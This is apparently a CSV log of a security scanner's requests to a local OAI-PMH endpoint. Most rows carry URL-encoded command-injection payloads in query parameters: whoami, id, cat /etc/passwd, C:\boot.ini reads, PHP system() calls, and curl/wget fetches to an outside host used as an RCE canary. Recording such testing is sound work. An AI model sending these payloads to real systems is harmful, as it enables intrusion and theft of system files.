uuid,timestamp,http_status_code,request_url,response_time,http_version
bf2757c9-0b62-494a-bd15-1c7a20bd63e4,2024-12-31 00:34:19,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2081.74 ms,HTTP/1.1
b10ab86c-c349-4d3a-9190-40f45888cbc4,2024-12-31 00:34:21,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%22+%26%26+whoami,2049.56 ms,HTTP/1.1
ef3d0582-812b-435d-866c-acea52abbca1,2024-12-31 00:34:23,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%22+%26%26+whoami,2098.91 ms,HTTP/1.1
a0f81d92-3bf8-4bd2-9a4d-45756bd8b7b5,2024-12-31 00:34:25,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%22+%26%26+whoami&until=%22+%26%26+whoami&set=%22+%26%26+whoami,2055.13 ms,HTTP/1.1
b6c601ba-0d96-4bd4-89fb-529c1c2dfe11,2024-12-31 00:34:30,403,http://localhost:8081/oai/request?verb=%22+whoami,2046.63 ms,HTTP/1.1
7dd66f1f-74b0-4859-88dd-b2d7c6cdf038,2024-12-31 00:34:32,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2099.43 ms,HTTP/1.1
4c9b61ed-e474-42dd-b769-49cca5d5a346,2024-12-31 00:34:34,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%22+whoami,2049.40 ms,HTTP/1.1
1a633bc2-8ac4-4a17-b3d1-c340428f11b1,2024-12-31 00:34:37,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%22+whoami,2041.54 ms,HTTP/1.1
95189620-c871-4a7b-adf2-fe8d9f5ec0a9,2024-12-31 00:34:39,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc,2521.23 ms,HTTP/1.1
f80dfc14-e58b-48d3-a8f4-d2e49a1b7c88,2024-12-31 00:34:42,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%22+whoami&metadataPrefix=oai_dc,2107.73 ms,HTTP/1.1
ae8b4722-9c07-4fce-a95b-1bbb1e829e19,2024-12-31 00:34:44,403,http://localhost:8081/oai/request?verb=%22+%7C+whoami,2005.42 ms,HTTP/1.1
cc04e783-6058-4a1b-ade8-4316f200bbca,2024-12-31 00:34:46,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2054.19 ms,HTTP/1.1
b9e370ac-a179-4873-b06e-18befd6449a0,2024-12-31 00:34:48,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%22+%7C+whoami,2100.32 ms,HTTP/1.1
c820d900-4ea6-443e-a679-f1d5d98ada56,2024-12-31 00:34:51,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&set=%22+%7C+whoami,2058.32 ms,HTTP/1.1
0172d9ea-9780-47f2-9239-6c9eed36f7a6,2024-12-31 00:34:53,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&until=%22+%7C+whoami,2073.11 ms,HTTP/1.1
5b399233-301c-4ea3-91a4-8b6c20b7de2f,2024-12-31 00:34:55,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%22+%7C+whoami&metadataPrefix=marc,2084.91 ms,HTTP/1.1
17e75c05-7a4a-4bf1-8ad9-305c870e83fa,2024-12-31 00:34:58,403,http://localhost:8081/oai/request?verb=%22+%7C%7C+whoami,2055.45 ms,HTTP/1.1
909f4a69-fd9d-4e2a-9b02-c3402520c44c,2024-12-31 00:35:00,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%22+%7C%7C+whoami,2064.16 ms,HTTP/1.1
fc5ce4d9-cfbd-4d44-ad82-cb00dcb49f09,2024-12-31 00:35:02,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%22+%7C%7C+whoami,2070.56 ms,HTTP/1.1
735da1ad-0db6-400a-9db2-0f155af4c908,2024-12-31 00:35:04,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%22+%7C%7C+whoami,2062.87 ms,HTTP/1.1
77c93f1b-bd36-4f90-a4f6-157cc0e855ea,2024-12-31 00:35:07,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc,2028.84 ms,HTTP/1.1
fa506091-5ce0-4ecb-9f1b-7d4166b38209,2024-12-31 00:35:09,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%22+%7C%7C+whoami&metadataPrefix=marc,2088.76 ms,HTTP/1.1
62bce816-fdc2-49b1-b3ce-68e834df4737,2024-12-31 00:35:11,403,http://localhost:8081/oai/request?verb=%22%27,2073.20 ms,HTTP/1.1
b064141c-3555-4497-83f0-8e31d5ac265e,2024-12-31 00:35:14,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2102.38 ms,HTTP/1.1
fbdc8ffa-f1a2-4227-85b2-b12e7cd711b8,2024-12-31 00:35:16,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%22%27,2062.01 ms,HTTP/1.1
2976a955-1acf-4734-a190-8c6608c21839,2024-12-31 00:35:18,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%22%27&set=%22%27,2098.64 ms,HTTP/1.1
1b6a6f79-65d6-4a43-9a08-a70292df4350,2024-12-31 00:35:20,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%22%27&until=%22%27&set=%22%27,2070.19 ms,HTTP/1.1
3b57877d-c6ec-4681-8430-d90e00777826,2024-12-31 00:35:23,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%22%27&metadataPrefix=oai_dc,2142.70 ms,HTTP/1.1
b584e04a-8eb9-4f18-9779-2295f66db27a,2024-12-31 00:35:25,403,http://localhost:8081/oai/request?verb=%22%3B+whoami,2050.24 ms,HTTP/1.1
150abee1-a37f-4f3c-b310-3982bf9fc255,2024-12-31 00:35:27,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%22%3B+whoami,2074.91 ms,HTTP/1.1
f6aa216e-dbf9-4a06-9c4a-c36f2d89c451,2024-12-31 00:35:29,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%22%3B+whoami,2042.80 ms,HTTP/1.1
d7ca72b8-427d-4c6b-9ad9-bf36e4cb59c3,2024-12-31 00:35:32,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%22%3B+whoami&set=%22%3B+whoami,2065.76 ms,HTTP/1.1
ded7edfa-3a1d-4647-8116-7bb3db6b3371,2024-12-31 00:35:34,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%22%3B+whoami,2078.62 ms,HTTP/1.1
0fc6ab7e-0100-4a45-9097-090fceb49072,2024-12-31 00:35:39,403,http://localhost:8081/oai/request?verb=%24%28%60cat+%2Fetc%2Fpasswd%60%29,2023.55 ms,HTTP/1.1
032d87ba-e7ac-4cc7-a3df-74e5691c8283,2024-12-31 00:35:41,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2109.64 ms,HTTP/1.1
ed0584e9-eff7-4777-914f-d4cefe75bca6,2024-12-31 00:35:43,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%24%28%60cat+%2Fetc%2Fpasswd%60%29,2071.14 ms,HTTP/1.1
0a1cd376-87fc-472c-adfb-5b2eddf156c9,2024-12-31 00:35:45,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%24%28%60cat+%2Fetc%2Fpasswd%60%29&until=%24%28%60cat+%2Fetc%2Fpasswd%60%29,2070.82 ms,HTTP/1.1
6683491f-857b-4796-b45c-309871124fea,2024-12-31 00:35:48,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%24%28%60cat+%2Fetc%2Fpasswd%60%29,2058.00 ms,HTTP/1.1
f5d386e7-2ade-4935-bcb0-05709c3e5333,2024-12-31 00:35:50,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%24%28%60cat+%2Fetc%2Fpasswd%60%29&metadataPrefix=oai_dc,2107.34 ms,HTTP/1.1
77fef77c-018f-430f-8a94-ad2d413cc7b1,2024-12-31 00:35:52,403,http://localhost:8081/oai/request?verb=%24%28%60curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,2079.23 ms,HTTP/1.1
b8615a99-35ca-4972-ba14-6690c4f5f0cd,2024-12-31 00:35:55,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%24%28%60curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,2092.97 ms,HTTP/1.1
f5de86c1-1784-4109-b2e7-03db84b54dc8,2024-12-31 00:35:57,200,http://localhost:8081/oai/request?verb=ListSets,2097.16 ms,HTTP/1.1
9c2697ad-6239-4e20-b570-bd3582c2c88a,2024-12-31 00:35:59,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%24%28%60curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29&set=%24%28%60curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,2083.16 ms,HTTP/1.1
4345b97d-8e3e-411e-b27f-04f19568607e,2024-12-31 00:36:01,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%24%28%60curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29&set=%24%28%60curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,2053.05 ms,HTTP/1.1
1c53e13a-4695-45c6-9379-1fb9c099efa9,2024-12-31 00:36:06,403,http://localhost:8081/oai/request?verb=%24%28%60dir%60%29,2074.16 ms,HTTP/1.1
25d7b38b-3196-4738-a983-b0c578816829,2024-12-31 00:36:08,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%24%28%60dir%60%29,2067.54 ms,HTTP/1.1
61c170e2-01e2-4b1a-ae24-6d75d3c5ed1b,2024-12-31 00:36:11,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%24%28%60dir%60%29,2079.93 ms,HTTP/1.1
de4f8a01-148d-412a-9c72-87f9cbd442c6,2024-12-31 00:36:13,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%24%28%60dir%60%29&set=%24%28%60dir%60%29,2079.89 ms,HTTP/1.1
c850ef2a-66ea-4a75-8326-1be29f98e470,2024-12-31 00:36:15,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%24%28%60dir%60%29&set=%24%28%60dir%60%29,2104.29 ms,HTTP/1.1
f2b75259-c60d-4486-a794-a01d1f56dfa8,2024-12-31 00:36:17,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%24%28%60dir%60%29&metadataPrefix=marc,2074.39 ms,HTTP/1.1
6b3a5c61-8047-4a28-86fb-a029206144d3,2024-12-31 00:36:20,403,http://localhost:8081/oai/request?verb=%24%28%60ls%60%29,2052.94 ms,HTTP/1.1
4b57ded5-a3a0-450c-99a7-01c5838d2c1c,2024-12-31 00:36:22,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%24%28%60ls%60%29,2058.77 ms,HTTP/1.1
aeb0e9db-6eed-4538-963b-b036b03c6f6b,2024-12-31 00:36:24,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%24%28%60ls%60%29,2061.52 ms,HTTP/1.1
a3103d9d-de22-41a7-8968-e4beb709db36,2024-12-31 00:36:26,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%24%28%60ls%60%29&set=%24%28%60ls%60%29,2076.41 ms,HTTP/1.1
c8ea6f0a-55cb-4d3e-a722-06505b67b2f9,2024-12-31 00:36:29,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%24%28%60ls%60%29&set=%24%28%60ls%60%29,2078.57 ms,HTTP/1.1
907b3bcf-994c-4d92-addf-21fdba9751ee,2024-12-31 00:36:33,403,http://localhost:8081/oai/request?verb=%24%28%60type+C%3A%5Cboot.ini%60%29,2037.73 ms,HTTP/1.1
97c8ad0b-ef79-4173-8ecf-4128eea7cf9a,2024-12-31 00:36:36,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2116.36 ms,HTTP/1.1
9d6507fb-b380-4849-9ff3-fdd345c255af,2024-12-31 00:36:38,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%24%28%60type+C%3A%5Cboot.ini%60%29,2068.47 ms,HTTP/1.1
3b5daa5a-9b5e-4a80-8ef1-a5b47163c0d8,2024-12-31 00:36:40,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc,2301.40 ms,HTTP/1.1
1b6a1f96-21e7-4dfd-b67a-e72300611c50,2024-12-31 00:36:43,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&set=%24%28%60type+C%3A%5Cboot.ini%60%29,2095.43 ms,HTTP/1.1
46d54abc-3354-4070-8a91-f4751b29ecca,2024-12-31 00:36:45,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%24%28%60type+C%3A%5Cboot.ini%60%29&metadataPrefix=marc,2063.16 ms,HTTP/1.1
e62deb1d-6195-4509-8da6-4f171796e811,2024-12-31 00:36:47,403,http://localhost:8081/oai/request?verb=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,2034.38 ms,HTTP/1.1
009ae063-6cce-4047-98a4-7e2fb639c6f9,2024-12-31 00:36:49,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,2086.92 ms,HTTP/1.1
fff371f1-2831-45b0-89f9-02970181798f,2024-12-31 00:36:52,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,2053.64 ms,HTTP/1.1
b0f4fdd9-ba89-4da1-83ba-b5725478c279,2024-12-31 00:36:54,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29&set=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,2071.43 ms,HTTP/1.1
723fdb28-0b5e-4f4d-9203-c90041796d73,2024-12-31 00:36:56,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,2044.99 ms,HTTP/1.1
54622559-0628-49a1-93dc-c75d014b8982,2024-12-31 00:36:58,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29&metadataPrefix=marc,2081.33 ms,HTTP/1.1
70ee86b1-4b65-4d4c-ac4f-2ffdf7e2d01d,2024-12-31 00:37:01,403,http://localhost:8081/oai/request?verb=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%60%29,2051.95 ms,HTTP/1.1
213e9dc3-c22b-4bcf-8bf9-e3362065f818,2024-12-31 00:37:03,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2059.40 ms,HTTP/1.1
959839f8-5531-4287-9644-fb9b4a71d9ff,2024-12-31 00:37:05,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%60%29,2080.77 ms,HTTP/1.1
c21922d2-c6c8-42d8-a6d6-af654611ded8,2024-12-31 00:37:07,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%60%29&set=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%60%29,2070.98 ms,HTTP/1.1
9fa93ca4-4076-4c64-b3c9-4dbecb0639e5,2024-12-31 00:37:10,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&set=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%60%29,2029.13 ms,HTTP/1.1
21c12599-89ed-459b-a90c-dfb47fd12540,2024-12-31 00:37:14,403,http://localhost:8081/oai/request?verb=%24%28%60whoami%60%29,2076.26 ms,HTTP/1.1
64c92e5c-d569-4ada-b25f-e815f2f7203c,2024-12-31 00:37:17,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2070.58 ms,HTTP/1.1
7f10c1c8-0716-4b93-b0af-98d71edd996d,2024-12-31 00:37:19,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%24%28%60whoami%60%29,2079.97 ms,HTTP/1.1
a33d4d13-df2a-4839-a0da-183093c849e7,2024-12-31 00:37:21,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%24%28%60whoami%60%29&set=%24%28%60whoami%60%29,2147.20 ms,HTTP/1.1
f5324224-8e52-4826-97dc-b74d1bb48635,2024-12-31 00:37:23,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%24%28%60whoami%60%29,2082.06 ms,HTTP/1.1
50be7413-8547-4bad-aebe-6a60b194107b,2024-12-31 00:37:28,403,http://localhost:8081/oai/request?verb=%24%3B%2Fusr%2Fbin%2Fid,2076.79 ms,HTTP/1.1
b84fa6ea-25c6-4c3c-abbd-a41cbd14b814,2024-12-31 00:37:30,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%24%3B%2Fusr%2Fbin%2Fid,2063.63 ms,HTTP/1.1
d5203321-5089-4f48-b023-531147e09b58,2024-12-31 00:37:33,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%24%3B%2Fusr%2Fbin%2Fid,2087.76 ms,HTTP/1.1
b09958db-cbed-455d-b9dc-67f7c0e79218,2024-12-31 00:37:35,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%24%3B%2Fusr%2Fbin%2Fid&until=%24%3B%2Fusr%2Fbin%2Fid,2050.10 ms,HTTP/1.1
ec6ed0ad-c9f3-48d3-8696-adcf8e2db4ab,2024-12-31 00:37:37,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%24%3B%2Fusr%2Fbin%2Fid&until=%24%3B%2Fusr%2Fbin%2Fid&set=%24%3B%2Fusr%2Fbin%2Fid,2121.19 ms,HTTP/1.1
e67bfed6-17e1-42b3-8c3b-2f173c419a9e,2024-12-31 00:37:42,403,http://localhost:8081/oai/request?verb=%24%7B%40print%28%22RCEVulnerable%22%29%7D,2032.42 ms,HTTP/1.1
bd12c198-abf0-4953-9644-fc78995c4cac,2024-12-31 00:37:44,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%24%7B%40print%28%22RCEVulnerable%22%29%7D,2055.70 ms,HTTP/1.1
6e65800b-1d7b-47bd-97d0-c06b444a9964,2024-12-31 00:37:46,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%24%7B%40print%28%22RCEVulnerable%22%29%7D,2090.43 ms,HTTP/1.1
3c205a1c-0be5-4a25-bd4a-092c0d9e910b,2024-12-31 00:37:48,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc,2083.03 ms,HTTP/1.1
d041b5ad-e417-4177-9ca5-75b712495e4e,2024-12-31 00:37:51,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%24%7B%40print%28%22RCEVulnerable%22%29%7D&set=%24%7B%40print%28%22RCEVulnerable%22%29%7D,2078.23 ms,HTTP/1.1
6b0bafe3-a38f-43cd-abd3-9024d85fd54e,2024-12-31 00:37:53,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%24%7B%40print%28%22RCEVulnerable%22%29%7D&metadataPrefix=marc,2055.60 ms,HTTP/1.1
475a43d1-aa86-4062-8f27-1f2d00f98444,2024-12-31 00:37:55,403,http://localhost:8081/oai/request?verb=%24%7B%40print%28system%28%24_SERVER%5B%27HTTP_USER_AGENT%27%5D%29%29%7D,2074.69 ms,HTTP/1.1
31de54b8-93c8-44d8-a22a-5dd9f44e938f,2024-12-31 00:37:58,403,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%24%7B%40print%28system%28%24_SERVER%5B%27HTTP_USER_AGENT%27%5D%29%29%7D,2046.02 ms,HTTP/1.1
767224cc-fbe8-4659-aeb5-eb351b315b6b,2024-12-31 00:38:00,403,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%24%7B%40print%28system%28%24_SERVER%5B%27HTTP_USER_AGENT%27%5D%29%29%7D,2042.64 ms,HTTP/1.1
89c0038e-e417-47fa-bad7-dbe7dfa7bcab,2024-12-31 00:38:02,403,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&set=%24%7B%40print%28system%28%24_SERVER%5B%27HTTP_USER_AGENT%27%5D%29%29%7D,2080.41 ms,HTTP/1.1
bda3ebbc-2a1d-4291-82f0-fd168ac27b4f,2024-12-31 00:38:04,403,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%24%7B%40print%28system%28%24_SERVER%5B%27HTTP_USER_AGENT%27%5D%29%29%7D,2056.36 ms,HTTP/1.1
2760a80d-70e9-4cac-81a3-1adc9be9967f,2024-12-31 00:38:07,403,http://localhost:8081/oai/request?verb=GetRecord&identifier=%24%7B%40print%28system%28%24_SERVER%5B%27HTTP_USER_AGENT%27%5D%29%29%7D&metadataPrefix=marc,2090.43 ms,HTTP/1.1
84a24414-d793-4672-bb29-15cbf439fe6c,2024-12-31 00:38:09,403,http://localhost:8081/oai/request?verb=%250A%2Fusr%2Fbin%2Fid,2034.43 ms,HTTP/1.1
d4f386e1-7136-4ce6-9bf1-8bcbd516fefa,2024-12-31 00:38:11,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%250A%2Fusr%2Fbin%2Fid,2097.12 ms,HTTP/1.1
ff722d8e-deb6-4792-8445-3e48bf88e4ef,2024-12-31 00:38:13,200,http://localhost:8081/oai/request?verb=ListSets,2074.78 ms,HTTP/1.1
bb75ff3a-41d4-4022-b041-287275606cdf,2024-12-31 00:38:16,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%250A%2Fusr%2Fbin%2Fid&until=%250A%2Fusr%2Fbin%2Fid&set=%250A%2Fusr%2Fbin%2Fid,2083.14 ms,HTTP/1.1
0f5ce543-00c1-47f4-9cd0-4b1b13d9172b,2024-12-31 00:38:18,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%250A%2Fusr%2Fbin%2Fid&set=%250A%2Fusr%2Fbin%2Fid,2034.98 ms,HTTP/1.1
39581abf-41e1-48ab-8a7d-92f60a9a9b86,2024-12-31 00:38:20,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%250A%2Fusr%2Fbin%2Fid&metadataPrefix=oai_dc,2126.97 ms,HTTP/1.1
d973c497-7a2b-4292-97c8-1f5735c9f860,2024-12-31 00:38:22,403,http://localhost:8081/oai/request?verb=%250A%2Fusr%2Fbin%2Fid%250A,2073.50 ms,HTTP/1.1
d77c14f1-9c33-47da-9391-8bb93227a581,2024-12-31 00:38:25,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2104.37 ms,HTTP/1.1
b16d2954-f5d1-42ca-ac95-28779d0c31f6,2024-12-31 00:38:27,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%250A%2Fusr%2Fbin%2Fid%250A,2076.74 ms,HTTP/1.1
43c6a8e3-64e1-478d-abe8-0981cc64e465,2024-12-31 00:38:29,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%250A%2Fusr%2Fbin%2Fid%250A&until=%250A%2Fusr%2Fbin%2Fid%250A&set=%250A%2Fusr%2Fbin%2Fid%250A,2068.72 ms,HTTP/1.1
28f7ad10-0d26-4d97-8fef-394d844ede42,2024-12-31 00:38:32,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&until=%250A%2Fusr%2Fbin%2Fid%250A&set=%250A%2Fusr%2Fbin%2Fid%250A,2083.68 ms,HTTP/1.1
11640f7f-4db0-49fc-875b-b86f18faa2f1,2024-12-31 00:38:34,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%250A%2Fusr%2Fbin%2Fid%250A&metadataPrefix=marc,2076.90 ms,HTTP/1.1
6bd36b03-9f09-45c1-8fb7-b97ff3647c31,2024-12-31 00:38:36,403,http://localhost:8081/oai/request?verb=%250Acat%2520%2Fetc%2Fpasswd,2074.26 ms,HTTP/1.1
